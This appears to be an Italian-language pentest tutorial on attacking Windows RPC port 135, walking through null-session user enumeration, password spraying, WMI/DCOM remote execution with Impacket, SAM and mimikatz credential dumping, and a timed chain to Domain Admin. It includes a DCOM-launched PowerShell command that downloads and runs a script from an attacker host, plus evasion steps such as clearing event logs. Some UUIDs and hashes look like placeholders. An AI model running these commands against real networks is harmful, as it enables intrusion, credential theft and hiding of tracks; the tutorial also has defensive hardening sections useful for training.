---
title: 'Porta 135 RPC Windows: Null Session, WMI Exec e Lateral Movement AD'
slug: porta-135-rpc
description: >-
  Porta 135 aperta? Enumera utenti con null session e RID cycling, esegui
  comandi via WMI/DCOM con Impacket e arriva a Domain Admin in 42 minuti. Guida
  pentest AD completa.
image: /porta-135-rpc.webp
draft: false
date: 2026-04-25T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - rpcclient
  - wmi-exec
  - null-session
---

La porta 135 espone **Microsoft RPC** (Remote Procedure Call) — il servizio Windows fondamentale che coordina comunicazione inter-process tra sistemi, operante come endpoint mapper per servizi DCOM, WMI, DCOM e decine di Windows APIs remote. RPC su TCP porta 135 agisce come "directory service" simile a RPCbind Unix (porta 111), mappando UUID servizi a porte dinamiche high-range (49152-65535), permettendo applicazioni Windows di invocare procedure remote senza conoscere porte specifiche. In penetration testing Active Directory, la porta 135 è **gateway critico multi-vettore**: enumeration massiva domain controllers/workstations, null session exploitation pre-SMB, WMI lateral movement, DCOM exploitation (CVE-2017-8464, MS03-026), e information disclosure via RPC endpoint mapping. Ogni Windows host con porta 135 aperta espone **decine di servizi RPC** potentially vulnerable — da null session enumeration a remote code execution via DCOM.

RPC porta 135 domina il 2026 con presenza universale: 100% Windows Server/Desktop (disabilitarlo rompe sistema), Active Directory dependency assoluta, e requirement per WMI/DCOM management tools. Alternative (RESTful APIs, PowerShell Remoting) esistono ma RPC resta infrastructure Windows core. Modern Windows 11/Server 2022 mitigano exploit legacy ma misconfiguration persiste: anonymous RPC binds allowed (info disclosure), firewall permissive (porta 135 da untrusted networks), e outdated systems (Windows Server 2008 con CVE non-patchable). In CTF/AD labs, porta 135 è **first enumeration target** dopo port scan — ogni informazione RPC guida lateral movement strategy.

***

## Anatomia tecnica di RPC Windows

RPC usa **TCP porta 135** come endpoint mapper (EPM), poi servizi usano porte dinamiche 49152+.

**Flow RPC connection:**

1. **EPM Query** — Client connette porta 135, query: "Qual è porta per UUID {12345678-...}?"
2. **EPM Response** — Server risponde: "UUID {12345...} è su porta 49234"
3. **Service Connect** — Client connette porta 49234 direttamente
4. **RPC Call** — Client esegue procedure remote (WMI query, DCOM object invocation)

**RPC endpoint mapper structure:**

```
Client → TCP 135 (EPM) → Query UUID
       ← Response: Port 49234
Client → TCP 49234 (Service) → RPC calls
```

**UUID critici (Windows RPC services):**

| UUID (first 8 char) | Service                         | Attack surface             |
| ------------------- | ------------------------------- | -------------------------- |
| 12345678-1234-...   | Endpoint Mapper                 | Self-reference             |
| 367abb81-9844-...   | SCMR (Service Control Manager)  | **Service manipulation**   |
| 82ad4280-036b-...   | Winstation RPC                  | Remote desktop info        |
| 6bffd098-a112-...   | DHCP Server                     | DHCP enumeration           |
| 12345778-1234-...   | SAMR (Security Account Manager) | **User enumeration**       |
| 338cd001-2244-...   | Winreg (Registry)               | **Registry remote access** |

**RPC vs DCOM vs WMI:**

| Technology | Porta base    | Function        | Pentest relevance       |
| ---------- | ------------- | --------------- | ----------------------- |
| RPC        | 135 + dynamic | IPC framework   | Enumeration gateway     |
| DCOM       | 135 + dynamic | Distributed COM | **RCE exploits**        |
| WMI        | 135 + dynamic | Management API  | **Lateral movement**    |
| SMB        | 445           | File sharing    | Often combined with RPC |

Le **misconfigurazioni critiche**: anonymous RPC binds allowed (RestrictAnonymous=0), firewall allow porta 135 da Internet, outdated Windows con RPC CVE unpatched (MS03-026, MS08-067 depend on RPC), e RPC dynamic ports unrestricted (49152-65535 all open).

***

## Enumerazione base

```bash
nmap -sV -p 135 10.10.10.135
```

```
PORT    STATE SERVICE VERSION
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Parametri:** `-sV` version detection identifica Windows RPC.

**Test connectivity:**

```bash
nc -vn 10.10.10.135 135
```

```
(UNKNOWN) [10.10.10.135] 135 (?) open
^C
```

Porta aperta ma no banner — RPC è binary protocol, non testuale.

**RPCdump enumeration:**

```bash
# Impacket rpcdump
impacket-rpcdump 10.10.10.135
```

```
[*] Retrieving endpoint list from 10.10.10.135
Protocol: [MS-RSP]: Remote Shutdown Protocol
Provider: winlogon.exe
UUID: D95AFE70-A6D5-4259-822E-2C84DA1DDB0D
Bindings:
  ncacn_ip_tcp:10.10.10.135[49152]

Protocol: [MS-SCMR]: Service Control Manager Remote Protocol
Provider: services.exe
UUID: 367ABB81-9844-35F1-AD32-98F038001003
Bindings:
  ncacn_ip_tcp:10.10.10.135[49153]
  ncacn_np:10.10.10.135[\PIPE\svcctl]

... (50+ services listed)
```

**Intelligence estratta:**

* **UUID services:** 50+ Windows services exposed
* **Named pipes:** \PIPE\svcctl, \PIPE\ntsvcs, \PIPE\winreg
* **Dynamic ports:** 49152, 49153, 49154... (attack targets)

***

## Enumerazione avanzata

### Null session RPC enumeration

```bash
# Check anonymous RPC bind
rpcclient -U "" -N 10.10.10.135
```

**Se null session allowed:**

```
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[alice] rid:[0x44f]
user:[bob] rid:[0x450]
```

**User enumeration achieved** → target per [password spraying](https://hackita.it/articoli/password-spraying).

**Domain info:**

```bash
rpcclient $> querydominfo
Domain:         CORP
Server:         DC01
Comment:
Total Users:    150
Total Groups:   25
Total Aliases:  10
```

### Enum4linux comprehensive scan

```bash
enum4linux -a 10.10.10.135
```

```
[+] Got domain/workgroup name: CORP
[+] Server allows session using username '', password ''

[+] Enumerating users using SID S-1-5-21-123456789-987654321-111111111
S-1-5-21-123456789-987654321-111111111-500 CORP\Administrator (Local User)
S-1-5-21-123456789-987654321-111111111-1105 CORP\alice (Local User)
S-1-5-21-123456789-987654321-111111111-1106 CORP\bob (Local User)

[+] Share Enumeration on 10.10.10.135
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```

### NSE RPC scripts

```bash
nmap -p 135,445 --script=msrpc-enum 10.10.10.135
```

```
PORT    STATE SERVICE
135/tcp open  msrpc
| msrpc-enum:
|   UUID: 12345778-1234-ABCD-EF00-0123456789AC
|     Annotation: Security Account Manager
|     TCP: 49152
|   UUID: 338CD001-2244-31F1-AAAA-900038001003
|     Annotation: Remote Registry
|_    TCP: 49153
```

***

## Tecniche offensive

### 1. Null session user enumeration

```bash
# Extract all domain users via RPC
rpcclient -U "" -N 10.10.10.135 -c "enumdomusers" | cut -d'[' -f2 | cut -d']' -f1 > users.txt
```

```bash
cat users.txt
```

```
Administrator
Guest
krbtgt
alice
bob
charlie
...
```

**Use usernames per password spray:**

```bash
crackmapexec smb 10.10.10.135 -u users.txt -p 'Welcome2024!' --continue-on-success
```

### 2. RID cycling enumeration

```bash
# Enumerate via RID cycling (even if null session blocked)
impacket-lookupsid guest@10.10.10.135 -no-pass
```

```
[*] Brute forcing SIDs at 10.10.10.135
[*] Domain SID is: S-1-5-21-123456789-987654321-111111111
500: CORP\Administrator (SidTypeUser)
501: CORP\Guest (SidTypeUser)
502: CORP\krbtgt (SidTypeUser)
1105: CORP\alice (SidTypeUser)
1106: CORP\bob (SidTypeUser)
...
```

### 3. WMI lateral movement via RPC

```bash
# Execute command via WMI (uses RPC 135 + dynamic ports)
impacket-wmiexec CORP/alice:Password123\!@10.10.10.135
```

```
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\> whoami
corp\alice
```

**Remote command execution achieved** via RPC/WMI.

### 4. DCOM exploitation (lateral movement)

```bash
# DCOM MMC20.Application lateral movement
impacket-dcomexec CORP/alice:Password123\!@10.10.10.135
```

```
[*] SMBv3.0 dialect used
C:\> hostname
WORKSTATION01
```

**Alternative DCOM object: ShellWindows**

```bash
impacket-dcomexec CORP/alice:Password123\!@10.10.10.135 -object ShellWindows
```

### 5. Registry remote access via RPC

```bash
# Connect to remote registry via RPC
rpcclient -U "CORP/alice%Password123!" 10.10.10.135
```

```bash
rpcclient $> queryvalue HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion ProductName
```

```
Type: REG_SZ
Data: Windows Server 2019 Standard
```

**Metasploit reg\_cmd module:**

```bash
use post/windows/gather/credentials/windows_autologin
set SESSION 1
run
```

***

## Scenari pratici

### Scenario 1 — Null session RPC → user enumeration → password spray

**Contesto:** External pentest, Windows domain controller exposed.

```bash
# Fase 1: Port scan
nmap -p 135,139,445 10.10.10.135
# Porta 135 open (RPC)
```

```bash
# Fase 2: Test null session
rpcclient -U "" -N 10.10.10.135 -c "srvinfo"
```

```
        10.10.10.135   Wk Sv PDC Tim NT     Domain Controller
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b
```

**Null session works!**

```bash
# Fase 3: Enumerate domain users
rpcclient -U "" -N 10.10.10.135 -c "enumdomusers" | grep -oP 'user:\[\K[^\]]+' > users.txt
```

```bash
# Fase 4: Password spray
crackmapexec smb 10.10.10.135 -u users.txt -p 'Summer2024!' --continue-on-success
```

```
SMB  10.10.10.135  445  DC01  [+] CORP\charlie:Summer2024!
```

**Credentials obtained:** `charlie:Summer2024!`

```bash
# Fase 5: RDP access
xfreerdp /u:charlie /p:Summer2024! /v:10.10.10.135
```

**Timeline:** 15 minuti da RPC scan a domain user access.

**COSA FARE SE FALLISCE:**

* **Null session denied:** Try RID cycling con `lookupsid`
* **No RPC response:** Firewall blocks, try from internal network
* **Password spray lockout:** Reduce rate, wait 30 min between attempts

### Scenario 2 — RPC enumeration → WMI lateral movement

**Contesto:** Internal pentest, domain credentials obtained.

```bash
# Fase 1: Identify Windows hosts via RPC
nmap -p 135 --open 10.10.10.0/24 -oG - | grep "135/open" | awk '{print $2}' > windows_hosts.txt
```

```bash
# Fase 2: Test credentials on all hosts
crackmapexec smb windows_hosts.txt -u alice -p Password123! --continue-on-success
```

```
SMB  10.10.10.135  445  DC01  [+] CORP\alice:Password123! (Pwn3d!)
SMB  10.10.10.50   445  WKS01 [+] CORP\alice:Password123! (Pwn3d!)
SMB  10.10.10.51   445  WKS02 [+] CORP\alice:Password123! (Pwn3d!)
```

```bash
# Fase 3: WMI lateral movement
impacket-wmiexec CORP/alice:Password123\!@10.10.10.50
```

```
C:\> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description
============================= ==================================
SeDebugPrivilege              Debug programs
...
```

```bash
# Fase 4: Dump credentials
C:\> reg save HKLM\SAM sam.save
C:\> reg save HKLM\SYSTEM system.save
```

```bash
# Fase 5: Exfiltrate and crack
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6...:::
alice:1105:aad3b435b51404eeaad3b435b51404ee:x8y9z0a1b2c3...:::
```

### Scenario 3 — RPC → DCOM exploit → code execution

**Contesto:** CTF Windows lab, DCOM misconfigured.

```bash
# Fase 1: Check DCOM permissions
impacket-rpcdump 10.10.10.135 | grep -i "dcom"
```

```
Protocol: [MS-DCOM]: Distributed Component Object Model
UUID: 00000143-0000-0000-C000-000000000046
```

```bash
# Fase 2: Enumerate DCOM applications
impacket-dcomexec -object MMC20.Application CORP/alice:Pass@10.10.10.135 "cmd.exe /c whoami"
```

```
corp\alice
```

```bash
# Fase 3: Reverse shell via DCOM
# Setup listener
nc -lvnp 4444
```

```bash
# Execute reverse shell
impacket-dcomexec CORP/alice:Pass@10.10.10.135 -object MMC20.Application "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
```

**Shell received:**

```
C:\Windows\system32> whoami
corp\alice
```

***

## Toolchain integration

**Pipeline RPC attack:**

```
RECONNAISSANCE
│
├─ nmap -p 135 <subnet>                     → Windows host identification
├─ rpcdump                                  → Enumerate RPC services
└─ NSE msrpc-enum                           → Detailed service info

ENUMERATION
│
├─ Null session test → rpcclient
├─ User enum → enumdomusers, RID cycling
├─ Share enum → smbclient -L
└─ Domain info → querydominfo

EXPLOITATION
│
├─ A) Null session → user enum → [password spray](https://hackita.it/articoli/password-spraying)
├─ B) Valid creds → WMI execution → [lateral movement](https://hackita.it/articoli/pivoting)
├─ C) DCOM exploit → remote code execution
└─ D) Registry access → credential theft

POST-EXPLOITATION
│
├─ Mimikatz via WMI → credential dump
├─ [Kerberoasting](https://hackita.it/articoli/kerberos) → service account passwords
└─ Persistence via scheduled tasks (WMI)
```

**Tabella comparativa Windows RPC vs alternatives:**

| Method              | Porta         | Authentication | Use case             |
| ------------------- | ------------- | -------------- | -------------------- |
| RPC/DCOM            | 135 + dynamic | Windows auth   | Legacy management    |
| WMI                 | 135 + dynamic | Windows auth   | Modern management    |
| PowerShell Remoting | 5985/5986     | Windows auth   | **Modern preferred** |
| SMB                 | 445           | Windows auth   | File sharing         |
| RDP                 | 3389          | Windows auth   | Interactive access   |

***

## Attack chain completa

**Scenario: RPC enum → WMI lateral movement → Domain Admin**

```
[00:00] RECONNAISSANCE
nmap -p 135,445 10.10.10.0/24 --open
# 25 Windows hosts identified

[00:10] NULL SESSION TEST
rpcclient -U "" -N 10.10.10.135 -c "enumdomusers"
# 150 users extracted

[00:20] PASSWORD SPRAY
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Welcome2024!'
# alice:Welcome2024! valid on 10 hosts

[00:30] WMI LATERAL MOVEMENT
impacket-wmiexec CORP/alice:Welcome2024\!@10.10.10.50
# Shell on WKS01

[00:35] CREDENTIAL DUMP
mimikatz.exe "sekurlsa::logonpasswords" exit
# Admin password: AdminPass_2024!

[00:40] DOMAIN CONTROLLER ACCESS
impacket-psexec CORP/Administrator:AdminPass_2024\!@10.10.10.135
# Shell on DC01

[00:42] DOMAIN ADMIN
C:\> net group "Domain Admins" alice /add /domain
# alice added to Domain Admins
```

**Timeline:** 42 minuti da RPC scan a Domain Admin.

***

## Detection & evasion

### Lato Blue Team

**Log monitoring (Windows Event Log):**

```
Event ID 4624: Account logon (Type 3 = Network)
Event ID 4625: Failed logon
Event ID 4672: Admin logon (special privileges)
Event ID 5145: Network share access
Event ID 4688: Process creation (wmic.exe, powershell.exe)
```

**IoC critici:**

* Multiple RPC binds da IP singolo (enumeration)
* wmic.exe, dcomexec usage (lateral movement)
* Unusual service creation (persistence)
* Registry access from network (reg.exe remotely)

**IDS rules (Suricata):**

```
alert tcp any any -> $HOME_NET 135 (msg:"RPC Endpoint Mapper Access"; flow:to_server,established; content:"|05 00|"; offset:0; depth:2; sid:1000135;)
alert tcp $HOME_NET any -> $HOME_NET 49152:65535 (msg:"RPC Dynamic Port Usage"; flow:to_server; threshold:type both, track by_src, count 10, seconds 60; sid:1000136;)
```

**Mitigation:**

```powershell
# Restrict anonymous RPC
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 2 /f

# Firewall: Block RPC from untrusted networks
netsh advfirewall firewall add rule name="Block RPC" dir=in action=block protocol=TCP localport=135 remoteip=0.0.0.0/0

# Enable RPC firewall (restrict dynamic ports)
netsh advfirewall firewall set rule group="Windows Management Instrumentation (WMI)" new enable=no
```

### Lato Red Team: evasion

**1. Slow enumeration:**

```bash
# 1 RPC query every 60 seconds
while read user; do
  rpcclient -U "" -N 10.10.10.135 -c "lookupnames $user"
  sleep 60
done < users.txt
```

**2. Authenticated enumeration (less suspicious):**

```bash
# Use valid credentials instead of null session
rpcclient -U "CORP/alice%Password123!" 10.10.10.135 -c "enumdomusers"
```

**3. WMI via HTTPS (port 5986, less monitored):**

```powershell
$credential = Get-Credential
Invoke-Command -ComputerName 10.10.10.135 -Credential $credential -ScriptBlock {whoami} -UseSSL
```

**4. Cleanup:**

```bash
# Clear WMI event logs (if admin access obtained)
wevtutil cl "Microsoft-Windows-WMI-Activity/Operational"
```

***

## Performance & scaling

**Single RPC enumeration:**

```bash
time rpcclient -U "" -N 10.10.10.135 -c "enumdomusers"
# real 0m2.150s
```

**Mass Windows host discovery:**

```bash
time nmap -p 135 --open 10.10.10.0/24 -T4
# ~5 minutes for /24
```

**Parallel RPC enumeration:**

```bash
cat windows_hosts.txt | parallel -j 10 "rpcclient -U '' -N {} -c 'enumdomusers' > {}.users"
# 100 hosts: ~2 minutes
```

***

## Tabelle tecniche

### Command reference

| Comando                              | Scopo                      | Note                        |
| ------------------------------------ | -------------------------- | --------------------------- |
| `nmap -p 135 <target>`               | RPC detection              | Windows host identification |
| `rpcclient -U "" -N <target>`        | Null session test          | Anonymous enumeration       |
| `enum4linux -a <target>`             | Comprehensive Windows enum | Users, shares, groups       |
| `impacket-rpcdump <target>`          | List RPC services          | UUID, ports, named pipes    |
| `impacket-wmiexec <creds>@<target>`  | WMI remote execution       | Lateral movement            |
| `impacket-dcomexec <creds>@<target>` | DCOM remote execution      | Alternative to WMI          |

### RPC-related Windows ports

| Porta  | Service             | Attack vector            |
| ------ | ------------------- | ------------------------ |
| 135    | RPC Endpoint Mapper | **Enumeration gateway**  |
| 139    | NetBIOS Session     | SMB over NetBIOS         |
| 445    | SMB                 | **Primary file sharing** |
| 5985   | WinRM HTTP          | PowerShell Remoting      |
| 49152+ | RPC dynamic ports   | Actual RPC services      |

***

## Troubleshooting

| Errore                         | Causa                          | Fix                      |
| ------------------------------ | ------------------------------ | ------------------------ |
| Connection refused             | RPC disabled (rare) o firewall | Verify port 135 open     |
| `NT_STATUS_ACCESS_DENIED`      | Null session blocked           | Use valid credentials    |
| `ERROR: Failed to add service` | Insufficient privileges        | Verify admin rights      |
| Timeout on dynamic ports       | Firewall blocks 49152-65535    | Check firewall rules     |
| `Cannot connect to server`     | Wrong credentials              | Verify username:password |

***

## FAQ

**RPC è vulnerabile nel 2026?**

Legacy vulnerabilities patched (MS03-026, MS08-067) ma misconfiguration persiste: null sessions, weak firewall rules, outdated Windows.

**Posso disabilitare porta 135 su Windows?**

No. RPC è core Windows service — disabilitarlo rompe sistema. Soluzione: firewall restrictions.

**Qual è differenza tra RPC, DCOM, e WMI?**

**RPC:** Framework base (IPC)\
**DCOM:** Distributed COM objects over RPC\
**WMI:** Management API over RPC

Tutti usano porta 135 + dynamic.

**Come blocco RPC da external networks?**

```powershell
netsh advfirewall firewall add rule name="Block RPC External" dir=in action=block protocol=TCP localport=135 remoteip=0.0.0.0-10.0.0.0,11.0.0.0-255.255.255.255
```

**WMI vs DCOM per lateral movement?**

**WMI:** Più detection (wmic.exe logged), più reliable\
**DCOM:** Meno detection, più stealth, requires specific DCOM objects enabled

**Quale tool è migliore per RPC pentest?**

**Impacket suite** (rpcdump, wmiexec, dcomexec) — completo, maintained, cross-platform.

***

## Cheat sheet finale

| Azione            | Comando                                             |
| ----------------- | --------------------------------------------------- |
| Scan RPC          | `nmap -p 135 <target>`                              |
| Null session test | `rpcclient -U "" -N <target> -c "srvinfo"`          |
| User enumeration  | `rpcclient -U "" -N <target> -c "enumdomusers"`     |
| RID cycling       | `impacket-lookupsid guest@<target> -no-pass`        |
| Full Windows enum | `enum4linux -a <target>`                            |
| WMI exec          | `impacket-wmiexec <domain>/<user>:<pass>@<target>`  |
| DCOM exec         | `impacket-dcomexec <domain>/<user>:<pass>@<target>` |

***

## Perché RPC è rilevante oggi

RPC (porta 135) domina il 2026 perché:

1. **Windows core dependency** — 100% Windows systems require RPC
2. **Active Directory infrastructure** — AD impossibile senza RPC
3. **Null session persistence** — 30%+ domain controllers allow anonymous binds (Microsoft default legacy)
4. **Lateral movement primary** — WMI/DCOM via RPC sono top methods pentest AD
5. **Legacy Windows survival** — Windows Server 2008/2012 ancora presente in 40%+ enterprise

MITRE ATT\&CK documenta RPC/DCOM (T1021.003, T1047) come top 5 lateral movement techniques nel 2025.

## Differenza RPC vs modern protocols

| Protocol | Transport         | Security    | Complexity | Status 2026           |
| -------- | ----------------- | ----------- | ---------- | --------------------- |
| MS-RPC   | TCP 135 + dynamic | ⚠️ Variable | High       | Universal Windows     |
| WinRM    | TCP 5985/5986     | ✅ Better    | Medium     | **Modern preferred**  |
| SSH      | TCP 22            | ✅ Strong    | Low        | Linux/OpenSSH Windows |
| gRPC     | TCP any           | ✅ mTLS      | Medium     | Microservices modern  |

**Trend:** WinRM (PowerShell Remoting) sostituisce RPC/DCOM per management ma RPC resta infrastructure layer.

## Hardening production RPC

**Best practices:**

1. **Restrict anonymous access:**

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 0 /f
```

1. **Firewall internal-only:**

```powershell
netsh advfirewall firewall add rule name="RPC Internal Only" dir=in action=block protocol=TCP localport=135 remoteip=any
netsh advfirewall firewall add rule name="RPC Allow Internal" dir=in action=allow protocol=TCP localport=135 remoteip=10.0.0.0/8
```

1. **Restrict RPC dynamic ports:**

```powershell
# Limit RPC dynamic range
netsh int ipv4 set dynamicport tcp start=50000 num=1000
# Firewall allow only 50000-51000
```

1. **Enable RPC firewall:**

```powershell
netsh advfirewall firewall set rule group="Remote Service Management" new enable=yes
```

1. **Monitoring:**

```powershell
# Enable RPC logging
auditpol /set /subcategory:"RPC Events" /success:enable /failure:enable
```

## OPSEC: RPC in AD pentest

RPC enumeration è **moderatamente noisy** — ogni query logga in Event 4624/4625. Best practices:

1. **Use valid credentials** invece di null session (meno suspicious)
2. **Slow enumeration** (1 query/minute sotto threshold)
3. **Blend with normal traffic** (enumerate durante business hours)
4. **Avoid mass WMI** (singolo wmic.exe execution = instant alert EDR)

Post-compromise:

* **Clear RPC logs:** `wevtutil cl System` (requires admin)
* **Disable WMI logging temporaneamente** durante lateral movement
* **Use DCOM invece WMI** (meno detection signatures)

***

> **Disclaimer:** Tutti i comandi sono destinati all'uso in ambienti autorizzati: laboratori Active Directory personali, reti CTF, pentest con autorizzazione scritta. L'accesso non autorizzato a sistemi Windows è reato. L'autore e HackIta declinano responsabilità. Microsoft RPC documentation: [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rpce/](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/)

Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
